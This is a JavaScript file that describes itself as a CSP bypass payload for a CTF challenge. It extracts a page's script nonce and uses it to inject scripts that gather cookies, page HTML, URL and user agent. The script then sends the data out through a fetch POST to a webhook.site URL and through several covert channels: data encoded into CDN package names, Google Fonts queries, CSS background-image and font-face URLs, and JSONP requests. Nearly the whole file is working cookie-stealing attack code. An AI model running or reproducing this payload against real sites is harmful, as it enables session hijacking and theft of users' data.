// CSP Bypass Script for CTF Challenge - Nonce-based bypass with HTML entity decoding
// CSP: default-src unpkg.com fonts.gstatic.com cdn.jsdelivr.net; style-src 'nonce-xxx' unpkg.com fonts.googleapis.com cdn.jsdelivr.net;

// Helper function to decode HTML entities
function decodeHtmlEntities(text) {
  const textarea = document.createElement('textarea');
  textarea.innerHTML = text;
  return textarea.value;
}

// First, extract and decode the nonce from existing elements
function extractNonce() {
  // Try multiple selectors to find nonce
  const nonceSelectors = [
    'script[nonce]',
    'style[nonce]',
    'link[nonce]',
    '[nonce]'
  ];
  
  let nonce = null;
  for (const selector of nonceSelectors) {
    const element = document.querySelector(selector);
    if (element && element.nonce) {
      nonce = element.nonce;
      break;
    }
    // Also try getAttribute in case nonce property doesn't work
    if (element && element.getAttribute && element.getAttribute('nonce')) {
      nonce = element.getAttribute('nonce');
      break;
    }
  }
  
  // If we found a nonce, decode HTML entities
  if (nonce) {
    const decodedNonce = decodeHtmlEntities(nonce);
    console.log('Raw nonce:', nonce);
    console.log('Decoded nonce:', decodedNonce);
    return decodedNonce;
  }
  
  // Fallback: try to extract from page source
  const pageSource = document.documentElement.outerHTML;
  const nonceMatch = pageSource.match(/nonce=["']([^"']+)["']/);
  if (nonceMatch) {
    const rawNonce = nonceMatch[1];
    const decodedNonce = decodeHtmlEntities(rawNonce);
    console.log('Extracted from source - Raw nonce:', rawNonce);
    console.log('Extracted from source - Decoded nonce:', decodedNonce);
    return decodedNonce;
  }
  
  console.log('No nonce found');
  return null;
}

// Global nonce variable
const NONCE = extractNonce();

// Strategy 1: Direct inline script execution with nonce
function nonceScriptExecution() {
  if (!NONCE) {
    console.log('No nonce found, skipping inline script execution');
    return;
  }
  
  console.log('🚀 Attempting nonce bypass with:', NONCE);
  
  const script = document.createElement('script');
  script.setAttribute('nonce', NONCE);
  script.textContent = `
    // 🎉 NONCE BYPASS SUCCESSFUL! 🎉
    console.log('🎯 NONCE BYPASS SUCCESSFUL! Script executed with nonce: ${NONCE}');
    
    // Direct data exfiltration with nonce bypass
    const exfilData = {
      url: location.href,
      cookies: document.cookie,
      html: document.documentElement.outerHTML,
      referrer: document.referrer,
      userAgent: navigator.userAgent,
      nonce: '${NONCE}',
      timestamp: new Date().toISOString()
    };
    
    console.log('📊 EXFIL DATA COLLECTED:', exfilData);
    
    // Try multiple exfiltration methods from within the nonce-enabled script
    
    // Method 1: Error-based exfiltration
    try {
      throw new Error('🎉 EXFIL_SUCCESS: ' + btoa(JSON.stringify(exfilData)));
    } catch(e) {
      console.log('🚨 Data exfiltrated via error:', e.message);
    }
    
    // Method 2: Console-based exfiltration  
    console.log('📝 EXFIL_CONSOLE:', btoa(JSON.stringify(exfilData)));
    
    // Method 3: DOM manipulation for data storage
    const hiddenDiv = document.createElement('div');
    hiddenDiv.id = 'exfil-data';
    hiddenDiv.style.display = 'none';
    hiddenDiv.setAttribute('data-exfil', btoa(JSON.stringify(exfilData)));
    hiddenDiv.textContent = btoa(JSON.stringify(exfilData));
    document.body.appendChild(hiddenDiv);
    console.log('💾 Data stored in hidden DOM element');
    
    // Method 4: Window name exfiltration
    window.name = 'EXFIL:' + btoa(JSON.stringify(exfilData)).substring(0, 100);
    console.log('🪟 Data stored in window.name');
    
    // Method 5: Location hash exfiltration (be careful not to reload page)
    const originalHash = window.location.hash;
    window.location.hash = '#exfil=' + btoa(JSON.stringify(exfilData)).substring(0, 50);
    console.log('🔗 Data stored in location.hash');
    
    // Method 6: Try to create a form and submit to our webhook
    try {
      const form = document.createElement('form');
      form.method = 'POST';
      form.action = 'https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497';
      form.style.display = 'none';
      
      const input = document.createElement('input');
      input.type = 'hidden';
      input.name = 'exfil_data';
      input.value = JSON.stringify(exfilData);
      
      form.appendChild(input);
      document.body.appendChild(form);
      
      console.log('📤 Attempting form submission...');
      // form.submit(); // Uncomment if you want to try form submission
    } catch(e) {
      console.log('❌ Form submission failed:', e);
    }
    
    // Method 7: Try fetch again from within nonce context
    try {
      fetch('https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          method: 'nonce_bypass_success',
          nonce: '${NONCE}',
          data: exfilData
        })
      }).then(() => {
        console.log('🌐 Fetch successful from nonce context!');
      }).catch(e => {
        console.log('🌐 Fetch still blocked:', e.message);
      });
    } catch(e) {
      console.log('❌ Fetch error:', e);
    }
    
    // Method 8: Alert for immediate visibility
    alert('🎉 CSP BYPASS SUCCESSFUL! Check console for exfiltrated data. Nonce: ${NONCE}');
  `;
  
  document.head.appendChild(script);
  console.log('✅ Nonce script injected successfully');
}

// Strategy 2: DNS Exfiltration via CDN subdomains with nonce
function dnsExfiltration() {
  const data = {
    url: location.href,
    cookies: document.cookie,
    domain: document.domain
  };
  
  // Encode data and split into chunks (DNS has length limits)
  const encoded = btoa(JSON.stringify(data)).replace(/[+=\/]/g, '');
  const chunks = encoded.match(/.{1,50}/g) || []; // Split into 50-char chunks
  
  chunks.forEach((chunk, index) => {
    const script = document.createElement('script');
    if (NONCE) script.setAttribute('nonce', NONCE);
    // Try to load from CDN with data in subdomain/path
    script.src = `https://cdn.jsdelivr.net/npm/nonexistent-package-${chunk}-${index}@1.0.0/index.js`;
    script.onerror = () => console.log(`DNS exfil chunk ${index} sent`);
    document.head.appendChild(script);
  });
}

// Strategy 3: Google Fonts API Abuse with nonce
function fontApiExfiltration() {
  const data = document.cookie;
  const encoded = btoa(data).replace(/[+=\/]/g, '').substring(0, 50);
  
  const style = document.createElement('style');
  if (NONCE) style.setAttribute('nonce', NONCE);
  style.textContent = `
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&text=${encoded}');
    body { font-family: 'Roboto', sans-serif; }
  `;
  document.head.appendChild(style);
}

// Strategy 4: CSS Background Image Exfiltration with nonce
function cssImageExfiltration() {
  const cookies = document.cookie;
  const encoded = btoa(cookies).replace(/[+=\/]/g, '').substring(0, 30);
  
  if (NONCE) {
    const style = document.createElement('style');
    style.setAttribute('nonce', NONCE);
    style.textContent = `
      body::after {
        content: '';
        background-image: url('https://fonts.gstatic.com/s/roboto/v27/nonexistent-${encoded}.woff2');
        width: 1px; height: 1px;
        position: absolute; top: -9999px;
      }
    `;
    document.head.appendChild(style);
  }
}

// Strategy 5: JSONP with npm packages using nonce
function npmJsonpExfiltration() {
  const data = btoa(document.cookie).replace(/[+=\/]/g, '').substring(0, 40);
  
  // Create JSONP callback with nonce-enabled script
  if (NONCE) {
    const callbackScript = document.createElement('script');
    callbackScript.setAttribute('nonce', NONCE);
    callbackScript.textContent = `
      window.exfilCallback = function(packageData) {
        console.log('JSONP callback triggered:', packageData);
        console.log('JSONP_EXFIL_SUCCESS:', '${data}');
        // Data was sent via the request URL
      };
    `;
    document.head.appendChild(callbackScript);
  }
  
  // Try JSONP-style requests to npm registry via jsdelivr
  const script = document.createElement('script');
  if (NONCE) script.setAttribute('nonce', NONCE);
  script.src = `https://cdn.jsdelivr.net/npm/package-${data}@latest/package.json?callback=exfilCallback`;
  script.onerror = () => console.log('JSONP exfil attempt made');
  document.head.appendChild(script);
}

// Strategy 6: Webpack/Module abuse with nonce
function webpackExfiltration() {
  const data = btoa(document.cookie).replace(/[+=\/]/g, '').substring(0, 30);
  
  const script = document.createElement('script');
  if (NONCE) script.setAttribute('nonce', NONCE);
  script.src = `https://unpkg.com/nonexistent-module-${data}@1.0.0/dist/index.js`;
  script.onerror = () => console.log('Webpack exfil attempt made');
  document.head.appendChild(script);
}

// Strategy 7: CSS @font-face with data in URL parameters using nonce
function fontFaceExfiltration() {
  const cookies = document.cookie;
  const url = location.href;
  const data = btoa(`${cookies}|${url}`).replace(/[+=\/]/g, '').substring(0, 50);
  
  if (NONCE) {
    const style = document.createElement('style');
    style.setAttribute('nonce', NONCE);
    style.textContent = `
      @font-face {
        font-family: 'ExfilFont';
        src: url('https://fonts.gstatic.com/s/roboto/v27/KFOmCnqEu92Fr1Mu4mxK.woff2?exfil=${data}'),
             url('https://fonts.googleapis.com/css2?family=Roboto&exfil=${data}');
      }
      .exfil-trigger { font-family: 'ExfilFont', sans-serif; }
    `;
    document.head.appendChild(style);
    
    // Create element to trigger font loading
    const div = document.createElement('div');
    div.className = 'exfil-trigger';
    div.textContent = 'X';
    div.style.position = 'absolute';
    div.style.top = '-9999px';
    document.body.appendChild(div);
  }
}

// Strategy 8: Error-based exfiltration via 404s with nonce
function errorBasedExfiltration() {
  const secrets = {
    cookies: document.cookie,
    url: location.href,
    referrer: document.referrer,
    userAgent: navigator.userAgent.substring(0, 50)
  };
  
  Object.keys(secrets).forEach(key => {
    const value = btoa(secrets[key]).replace(/[+=\/]/g, '').substring(0, 40);
    const script = document.createElement('script');
    if (NONCE) script.setAttribute('nonce', NONCE);
    script.src = `https://cdn.jsdelivr.net/npm/${key}-${value}@1.0.0/index.js`;
    script.onerror = () => console.log(`${key} exfiltrated via 404`);
    document.head.appendChild(script);
  });
}

// Strategy 9: Real JSONP endpoints with nonce
function realJsonpExfiltration() {
  if (NONCE) {
    const callbackScript = document.createElement('script');
    callbackScript.setAttribute('nonce', NONCE);
    callbackScript.textContent = `
      window.exfilData = function(data) {
        console.log('Real JSONP callback hit:', data);
        const exfilPayload = btoa(document.cookie + '|' + location.href);
        console.log('REAL_JSONP_EXFIL:', exfilPayload);
        throw new Error('EXFIL_DATA:' + exfilPayload);
      };
    `;
    document.head.appendChild(callbackScript);
  }
  
  const jsonpUrls = [
    'https://unpkg.com/browse/react@17.0.2/?callback=exfilData',
    'https://cdn.jsdelivr.net/npm/lodash@4.17.21/package.json?callback=exfilData'
  ];
  
  jsonpUrls.forEach(url => {
    const script = document.createElement('script');
    if (NONCE) script.setAttribute('nonce', NONCE);
    script.src = url;
    document.head.appendChild(script);
  });
}

// Execute all bypass strategies
console.log('🚀 Starting nonce-based CSP bypass attempts...');
console.log('Target nonce from HTML: dtSfrCngNYTgXc8lJXEZXg==');
console.log('Extracted nonce:', NONCE);

if (NONCE) {
  console.log('✅ Nonce found! All strategies will use nonce for bypass');
  console.log('Expected nonce: dtSfrCngNYTgXc8lJXEZXg==');
  console.log('Actual nonce:', NONCE);
  console.log('Nonce match:', NONCE === 'dtSfrCngNYTgXc8lJXEZXg==');
  
  // Execute the most powerful strategy first
  nonceScriptExecution();
} else {
  console.log('❌ No nonce found, using alternative methods');
}

// Execute additional strategies
console.log('🔄 Executing additional exfiltration strategies...');
dnsExfiltration();
fontApiExfiltration();
cssImageExfiltration();
npmJsonpExfiltration();
webpackExfiltration();
fontFaceExfiltration();
errorBasedExfiltration();
realJsonpExfiltration();

// Monitor for any successful exfiltration
window.addEventListener('error', function(e) {
  if (e.message && e.message.includes('EXFIL_SUCCESS')) {
    console.log('🎉 Data exfiltrated via error:', e.message);
  }
});

// Final status
setTimeout(() => {
  console.log('🔍 Final status check:');
  console.log('1. Check console for 🎯 NONCE BYPASS SUCCESSFUL message');
  console.log('2. Check for alert popup');
  console.log('3. Check network tab for requests');
  console.log('4. Check DOM for hidden elements');
  
  // Try to retrieve stored data
  const hiddenData = document.getElementById('exfil-data');
  if (hiddenData) {
    console.log('📦 Data found in DOM:', hiddenData.getAttribute('data-exfil'));
  }
  if (window.name.includes('EXFIL:')) {
    console.log('🪟 Data found in window.name:', window.name);
  }
  if (window.location.hash.includes('exfil=')) {
    console.log('🔗 Data found in location.hash:', window.location.hash);
  }
}, 3000);

console.log('🎯 All nonce-enhanced exfiltration attempts initiated!');
